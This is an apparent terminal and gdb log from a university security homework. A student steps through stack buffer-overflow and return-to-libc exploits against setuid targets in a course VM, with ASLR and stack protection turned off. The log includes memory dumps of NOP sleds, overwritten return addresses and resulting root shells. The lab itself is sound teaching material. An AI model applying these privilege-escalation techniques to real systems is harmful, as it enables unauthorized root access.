Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1636 is executing new program: /tmp/target2

Breakpoint 1, main (argc=3, argv=0xbffffb64) at target2.c:23
23	  int real_size = 0;
(gdb) p/x getenv("shellcode")
$1 = 0xbffffe0d
(gdb) b 15
Breakpoint 3 at 0x8048577: file target2.c, line 15.
(gdb) c
Continuing.

Breakpoint 3, greeting (temp1=0xbffffc64 '\220' <repeats 200 times>..., input_size=399) at target2.c:16
16	  strcpy(name, temp1);
(gdb) info frame
Stack level 0, frame at 0xbffffab8:
 eip = 0x8048577 in greeting (target2.c:16); saved eip = 0x804863a
 called by frame at 0xbffffad0
 source language c.
 Arglist at 0xbffffab0, args: temp1=0xbffffc64 '\220' <repeats 200 times>..., input_size=399
 Locals at 0xbffffab0, Previous frame's sp is 0xbffffab8
 Saved registers:
  ebp at 0xbffffab0, eip at 0xbffffab4
(gdb) x/64x 0xbffffab0-128
0xbffffa30:	0x00000000	0xb7f4f700	0xb7f4ee00	0x0504a024
0xbffffa40:	0xffffffff	0x00000000	0xbffffdfd	0x00000001
0xbffffa50:	0x00000001	0xb7e390b9	0x00000000	0xb7fbb000
0xbffffa60:	0xb7fbb000	0xbffffac8	0xb7e38f20	0xbffffdfd
0xbffffa70:	0x00000000	0x0000000a	0x00000000	0xb7fbbc20
0xbffffa80:	0xb7e13e98	0xb7fbb000	0xbffffa8c	0xb7fe97eb
0xbffffa90:	0x00000000	0xb7e38ef5	0xb7e36260	0xbffffdfd
0xbffffaa0:	0x00000000	0x0000000a	0xb7e36250	0xbffffdfd
0xbffffab0:	0xbffffac8	0x0804863a	0xbffffc64	0x0000018f
0xbffffac0:	0x0001018f	0x00000198	0x00000000	0xb7e21637
0xbffffad0:	0x00000003	0xbffffb64	0xbffffb74	0x00000000
0xbffffae0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffaf0:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffb00:	0x00000000	0x2107bb3a	0x1ad9f52a	0x00000000
0xbffffb10:	0x00000000	0x00000000	0x00000003	0x08048430
0xbffffb20:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
17	  printf( "Hi %s\n", name );
(gdb) x/64x 0xbffffab0-128
0xbffffa30:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa40:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa50:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa60:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa70:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa80:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa90:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffaa0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffab0:	0x90909090	0x90909090	0xbffffc00	0x0000018f
0xbffffac0:	0x0001018f	0x00000198	0x00000000	0xb7e21637
0xbffffad0:	0x00000003	0xbffffb64	0xbffffb74	0x00000000
0xbffffae0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffaf0:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffb00:	0x00000000	0x2107bb3a	0x1ad9f52a	0x00000000
0xbffffb10:	0x00000000	0x00000000	0x00000003	0x08048430
0xbffffb20:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1636] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
input_size=399Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804856d: file sploit2.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1681 is executing new program: /tmp/target2

Breakpoint 1, main (argc=3, argv=0xbffffb64) at target2.c:23
23	  int real_size = 0;
(gdb) b 15
Breakpoint 3 at 0x8048577: file target2.c, line 15.
(gdb) c
Continuing.

Breakpoint 3, greeting (temp1=0xbffffc64 '\220' <repeats 200 times>..., input_size=399) at target2.c:16
16	  strcpy(name, temp1);
(gdb) info frame
Stack level 0, frame at 0xbffffab8:
 eip = 0x8048577 in greeting (target2.c:16); saved eip = 0x804863a
 called by frame at 0xbffffad0
 source language c.
 Arglist at 0xbffffab0, args: temp1=0xbffffc64 '\220' <repeats 200 times>..., input_size=399
 Locals at 0xbffffab0, Previous frame's sp is 0xbffffab8
 Saved registers:
  ebp at 0xbffffab0, eip at 0xbffffab4
(gdb) x/64x 0xbffffab0-128
0xbffffa30:	0x00000000	0xb7f4f700	0xb7f4ee00	0x0504a024
0xbffffa40:	0xffffffff	0x00000000	0xbffffdfd	0x00000001
0xbffffa50:	0x00000001	0xb7e390b9	0x00000000	0xb7fbb000
0xbffffa60:	0xb7fbb000	0xbffffac8	0xb7e38f20	0xbffffdfd
0xbffffa70:	0x00000000	0x0000000a	0x00000000	0xb7fbbc20
0xbffffa80:	0xb7e13e98	0xb7fbb000	0xb7fb9244	0xb7fe97eb
0xbffffa90:	0x00000000	0xb7e38ef5	0xb7e36260	0xbffffdfd
0xbffffaa0:	0x00000000	0x0000000a	0xb7e36250	0xbffffdfd
0xbffffab0:	0xbffffac8	0x0804863a	0xbffffc64	0x0000018f
0xbffffac0:	0x0001018f	0x00000198	0x00000000	0xb7e21637
0xbffffad0:	0x00000003	0xbffffb64	0xbffffb74	0x00000000
0xbffffae0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffaf0:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffb00:	0x00000000	0xd1e99206	0xea37dc16	0x00000000
0xbffffb10:	0x00000000	0x00000000	0x00000003	0x08048430
0xbffffb20:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) n
17	  printf( "Hi %s\n", name );
(gdb) x/64x 0xbffffab0-128
0xbffffa30:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa40:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa50:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa60:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa70:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa80:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffa90:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffaa0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffab0:	0x90909090	0x90909090	0xbffffc00	0x0000018f
0xbffffac0:	0x0001018f	0x00000198	0x00000000	0xb7e21637
0xbffffad0:	0x00000003	0xbffffb64	0xbffffb74	0x00000000
0xbffffae0:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffaf0:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffb00:	0x00000000	0xd1e99206	0xea37dc16	0x00000000
0xbffffb10:	0x00000000	0x00000000	0x00000003	0x08048430
0xbffffb20:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
(gdb) p/x getenv("shellcode")
$1 = 0xbffffe0d
(gdb) q
A debugging session is active.

	Inferior 1 [process 1681] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit2
input_size=399Hi ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
# whoami
root
# exit
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploitEC.c
sploit0      sploit1    sploit2    sploit3    sploit4.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit4
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit4
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit4
Reading symbols from sploit4...done.
(gdb) break main
Breakpoint 1 at 0x80484cc: file sploit4.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit4 

Breakpoint 1, main () at sploit4.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1845 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffed4) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 3 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 3, foo (temp=0xbfffffc0 "student") at target4.c:10
10	  strcpy(name, temp);
(gdb) info frame
Stack level 0, frame at 0xbffffe34:
 eip = 0x80484a1 in foo (target4.c:10); saved eip = 0x80484e8
 called by frame at 0xbffffe40
 source language c.
 Arglist at 0xbffffe2c, args: temp=0xbfffffc0 "student"
 Locals at 0xbffffe2c, Previous frame's sp is 0xbffffe34
 Saved registers:
  ebp at 0xbffffe2c, eip at 0xbffffe30
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffd2
(gdb) p/x system
$2 = Value can't be converted to integer.
(gdb) p/x System
No symbol "System" in current context.
(gdb) print &system
$3 = (<text variable, no debug info> *) 0xb7e43da0 <__libc_system>
(gdb) x/64x 0xbffffe2c-128
0xbffffdac:	0xb7e7a3e8	0xbfffffc8	0x0804b00a	0x00006873
0xbffffdbc:	0xb7e371a0	0xbfffffca	0x0804b00a	0x00000007
0xbffffdcc:	0xb7fff000	0xb7fbb000	0xb7fbb000	0x00000007
0xbffffddc:	0x00000009	0x00000008	0x0000000a	0xb7e370f9
0xbffffdec:	0x00000000	0xb7fbb000	0xb7fbb000	0xbffffdfc
0xbffffdfc:	0xbffffe1f	0x0804b008	0x00000000	0xb7e37a50
0xbffffe0c:	0x0804854b	0x00000002	0xbffffed4	0xbffffee0
0xbffffe1c:	0xcc048521	0xb7fbb3dc	0x08048220	0x08048509
0xbffffe2c:	0xbffffe38	0x080484e8	0xbfffffc0	0x00000000
0xbffffe3c:	0xb7e21637	0x00000002	0xbffffed4	0xbffffee0
0xbffffe4c:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffe5c:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffe6c:	0xb7fbb000	0x00000000	0xc1d0a030	0xfa07ce20
0xbffffe7c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe8c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe9c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) n
11	}
(gdb) x/64x 0xbffffe2c-128
0xbffffdac:	0xb7fd54a0	0x00000001	0x00000001	0x00000000
0xbffffdbc:	0xb7e371a0	0xb7e7df95	0xb7fe996a	0x00000007
0xbffffdcc:	0xb7fff000	0xb7fff000	0x08048250	0x00000007
0xbffffddc:	0x00000009	0x00000008	0xb7e0d598	0xb7e370f9
0xbffffdec:	0x00000000	0xb7fe97eb	0x00000000	0xb7fbb000
0xbffffdfc:	0xb7fbb000	0xbffffe2c	0xb7ff0010	0xbffffe64
0xbffffe0c:	0xb7e8fe10	0xbffffe28	0xb7fff918	0x00000008
0xbffffe1c:	0x080484ad	0xbffffe28	0xbfffffc0	0x64757473
0xbffffe2c:	0x00746e65	0x080484e8	0xbfffffc0	0x00000000
0xbffffe3c:	0xb7e21637	0x00000002	0xbffffed4	0xbffffee0
0xbffffe4c:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffe5c:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffe6c:	0xb7fbb000	0x00000000	0xc1d0a030	0xfa07ce20
0xbffffe7c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe8c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
0xbffffe9c:	0xb7fff000	0x00000002	0x080483a0	0x00000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 1845] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit4
sh: 1: target4: not found
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit4
Reading symbols from sploit4...done.
(gdb) break main
Breakpoint 1 at 0x80484cc: file sploit4.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit4 

Breakpoint 1, main () at sploit4.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1894 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffeb4) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 3 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 3, foo (temp=0xbfffffa6 "\220\220\220\220\220\220\220\220\240=䷐\220\220\220\322\377\377\277")
    at target4.c:10
10	  strcpy(name, temp);
(gdb) info frame
Stack level 0, frame at 0xbffffe14:
 eip = 0x80484a1 in foo (target4.c:10); saved eip = 0x80484e8
 called by frame at 0xbffffe20
 source language c.
 Arglist at 0xbffffe0c, args: 
    temp=0xbfffffa6 "\220\220\220\220\220\220\220\220\240=䷐\220\220\220\322\377\377\277"
 Locals at 0xbffffe0c, Previous frame's sp is 0xbffffe14
 Saved registers:
  ebp at 0xbffffe0c, eip at 0xbffffe10
(gdb) x/32x 0xbffffe0c-16
0xbffffdfc:	0x08048521	0xb7fbb3dc	0x08048220	0x08048509
0xbffffe0c:	0xbffffe18	0x080484e8	0xbfffffa6	0x00000000
0xbffffe1c:	0xb7e21637	0x00000002	0xbffffeb4	0xbffffec0
0xbffffe2c:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffe3c:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffe4c:	0xb7fbb000	0x00000000	0x871eea8d	0xbcc9449d
0xbffffe5c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffe6c:	0x080483a0	0x00000000	0xb7ff0010	0xb7fea880
(gdb) x/16x 0xbffffe0c-16
0xbffffdfc:	0x08048521	0xb7fbb3dc	0x08048220	0x08048509
0xbffffe0c:	0xbffffe18	0x080484e8	0xbfffffa6	0x00000000
0xbffffe1c:	0xb7e21637	0x00000002	0xbffffeb4	0xbffffec0
0xbffffe2c:	0x00000000	0x00000000	0x00000000	0xb7fbb000
(gdb) x/16x 0xbffffe0c-24
0xbffffdf4:	0xbffffeb4	0xbffffec0	0x08048521	0xb7fbb3dc
0xbffffe04:	0x08048220	0x08048509	0xbffffe18	0x080484e8
0xbffffe14:	0xbfffffa6	0x00000000	0xb7e21637	0x00000002
0xbffffe24:	0xbffffeb4	0xbffffec0	0x00000000	0x00000000
(gdb) x/16x 0xbffffe0c-32
0xbffffdec:	0x0804854b	0x00000002	0xbffffeb4	0xbffffec0
0xbffffdfc:	0x08048521	0xb7fbb3dc	0x08048220	0x08048509
0xbffffe0c:	0xbffffe18	0x080484e8	0xbfffffa6	0x00000000
0xbffffe1c:	0xb7e21637	0x00000002	0xbffffeb4	0xbffffec0
(gdb) n
11	}
(gdb) x/16x 0xbffffe0c-32
0xbffffdec:	0xb7e8fe10	0xbffffe08	0x00000000	0xb7fbb000
0xbffffdfc:	0x080484ad	0xbffffe08	0xbfffffa6	0x90909090
0xbffffe0c:	0x90909090	0xb7e43da0	0x90909090	0xbfffffd2
0xbffffe1c:	0xb7e21600	0x00000002	0xbffffeb4	0xbffffec0
(gdb) n
__libc_system (line=0xbfffffd2 "target4") at ../sysdeps/posix/system.c:178
178	../sysdeps/posix/system.c: No such file or directory.
(gdb) n
179	in ../sysdeps/posix/system.c
(gdb) n
185	in ../sysdeps/posix/system.c
(gdb) n
184	in ../sysdeps/posix/system.c
(gdb) n
do_system (line=0xbfffffd2 "target4") at ../sysdeps/posix/system.c:55
55	in ../sysdeps/posix/system.c
(gdb) n
66	in ../sysdeps/posix/system.c
(gdb) n
55	in ../sysdeps/posix/system.c
(gdb) n
66	in ../sysdeps/posix/system.c
(gdb) n
55	in ../sysdeps/posix/system.c
(gdb) n
66	in ../sysdeps/posix/system.c
(gdb) n
64	in ../sysdeps/posix/system.c
(gdb) n
65	in ../sysdeps/posix/system.c
(gdb) n
66	in ../sysdeps/posix/system.c
(gdb) n
68	in ../sysdeps/posix/system.c
(gdb) n
69	in ../sysdeps/posix/system.c
(gdb) n
71	in ../sysdeps/posix/system.c
(gdb) n
76	in ../sysdeps/posix/system.c
(gdb) n
83	in ../sysdeps/posix/system.c
(gdb) n
86	in ../sysdeps/posix/system.c
(gdb) n
88	in ../sysdeps/posix/system.c
(gdb) n
112	in ../sysdeps/posix/system.c
(gdb) n
116	in ../sysdeps/posix/system.c
(gdb) n
0xb7fd9cec in ?? ()
(gdb) n
Cannot find bounds of current function
(gdb) n
Cannot find bounds of current function
(gdb) q
A debugging session is active.

	Inferior 1 [process 1894] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit4
sh: 1: target4: not found
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit4
Reading symbols from sploit4...done.
(gdb) break main
Breakpoint 1 at 0x80484cc: file sploit4.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit4 

Breakpoint 1, main () at sploit4.c:11
11	{
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e43da0 <__libc_system>
(gdb) p/x getenv("shellcode")
$2 = 0x0
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1941 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffeb4) at target4.c:16
16	  if( argc != 2 )
(gdb) p system
$3 = {<text variable, no debug info>} 0xb7e43da0 <__libc_system>
(gdb) p/x getenv("shellcode")
$4 = 0xbfffffc5
(gdb) q
A debugging session is active.

	Inferior 1 [process 1941] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit4
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit4
Reading symbols from sploit4...done.
(gdb) break main
Breakpoint 1 at 0x80484cc: file sploit4.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit4 

Breakpoint 1, main () at sploit4.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1988 is executing new program: /tmp/target4

Breakpoint 1, main (argc=2, argv=0xbffffeb4) at target4.c:16
16	  if( argc != 2 )
(gdb) b 10
Breakpoint 3 at 0x80484a1: file target4.c, line 10.
(gdb) c
Continuing.

Breakpoint 3, foo (
    temp=0xbfffffa6 "\220\220\220\220\220\220\220\220\240=\344\267word\322\377\377", <incomplete sequence \305>) at target4.c:10
10	  strcpy(name, temp);
(gdb) q
A debugging session is active.

	Inferior 1 [process 1988] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit4
$ whoami
student
$ exit
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo apt-get install zsh; sudo rm /bin/sh; sudo ln -s /bin/zsh /bin/sh
[sudo] password for student: 
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following additional packages will be installed:
  zsh-common
Suggested packages:
  zsh-doc
The following NEW packages will be installed:
  zsh zsh-common
0 upgraded, 2 newly installed, 0 to remove and 93 not upgraded.
Need to get 3,853 kB of archives.
After this operation, 14.1 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 zsh-common all 5.1.1-1ubuntu2.3 [3,182 kB]
Get:2 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 zsh i386 5.1.1-1ubuntu2.3 [671 kB]
Fetched 3,853 kB in 1s (3,059 kB/s)
Selecting previously unselected package zsh-common.
(Reading database ... 217024 files and directories currently installed.)
Preparing to unpack .../zsh-common_5.1.1-1ubuntu2.3_all.deb ...
Unpacking zsh-common (5.1.1-1ubuntu2.3) ...
Selecting previously unselected package zsh.
Preparing to unpack .../zsh_5.1.1-1ubuntu2.3_i386.deb ...
Unpacking zsh (5.1.1-1ubuntu2.3) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up zsh-common (5.1.1-1ubuntu2.3) ...
Setting up zsh (5.1.1-1ubuntu2.3) ...
update-alternatives: using /bin/zsh5 to provide /bin/zsh (zsh) in auto mode
update-alternatives: using /bin/zsh5 to provide /bin/rzsh (rzsh) in auto mode
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4 ; echo whoami | ./sploit4
root
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit4
Reading symbols from sploit4...done.
(gdb) break main
Breakpoint 1 at 0x80484cc: file sploit4.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit4 

Breakpoint 1, main () at sploit4.c:11
11	{
(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7e379d0 <__GI_exit>
(gdb) q
A debugging session is active.

	Inferior 1 [process 2584] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4 ; echo whoami | ./sploit4
root
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo ln -s /bin/dash /bin/sh
ln: failed to create symbolic link '/bin/sh': File exists
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo rm /bin/sh
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ sudo ln -s /bin/dash /bin/sh
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit4.c -o sploit4 ; echo whoami | ./sploit4
student
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-70-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
0 updates are security updates.

Last login: Sat Nov 30 03:13:27 2019 from 10.0.2.2
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for student: 
kernel.randomize_va_space = 0
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ../sploits/
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploit4.c
sploit0      sploit1    sploit2    sploit3    sploit4    sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit0
Reading symbols from sploit0...done.
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit0.c, line 22.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit0 

Breakpoint 1, main () at sploit0.c:22
22	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1309 is executing new program: /tmp/target0

Breakpoint 1, main (argc=2, argv=0xbffffd64) at target0.c:16
16		greeting( argv[1] );
(gdb) b 9\
Quit
(gdb) b 9
Function "9b 9" not defined.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) b 9
Breakpoint 3 at 0x804848a: file target0.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, greeting (temp1=0xbffffe56 '\220' <repeats 200 times>...) at target0.c:9
9		strcpy(name, temp1);
(gdb) info frame
Stack level 0, frame at 0xbffffcc4:
 eip = 0x804848a in greeting (target0.c:9); saved eip = 0x80484c4
 called by frame at 0xbffffcd0
 source language c.
 Arglist at 0xbffffcbc, args: temp1=0xbffffe56 '\220' <repeats 200 times>...
 Locals at 0xbffffcbc, Previous frame's sp is 0xbffffcc4
 Saved registers:
  ebp at 0xbffffcbc, eip at 0xbffffcc0
(gdb) x/64x 0xbffffcbc-128
0xbffffc3c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc4c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc5c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc6c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc7c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc8c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc9c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffcac:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffcbc:	0xbffffcc8	0x080484c4	0xbffffe56	0x00000000
0xbffffccc:	0xb7e21637	0x00000002	0xbffffd64	0xbffffd70
0xbffffcdc:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffcec:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffcfc:	0xb7fbb000	0x00000000	0x32211e95	0x09f35085
0xbffffd0c:	0x00000000	0x00000000	0x00000000	0x00000002
0xbffffd1c:	0x08048370	0x00000000	0xb7ff0010	0xb7fea880
0xbffffd2c:	0xb7fff000	0x00000002	0x08048370	0x00000000
(gdb) n
10		printf( "Hi %s\n", name );
(gdb) x/64x 0xbffffcbc-128
0xbffffc3c:	0xbffffb2c	0xbffffb2c	0xbffffb2c	0xbffffb2c
0xbffffc4c:	0xbffffb2c	0xbffffb2c	0xbffffb2c	0xbffffb2c
0xbffffc5c:	0xbffffb2c	0xbffffb2c	0xbffffb2c	0xbffffb2c
0xbffffc6c:	0xbffffb2c	0xbffffb2c	0xbffffb2c	0xbffffb2c
0xbffffc7c:	0xbffffb2c	0xbffffb2c	0xbffffb2c	0xbffffb2c
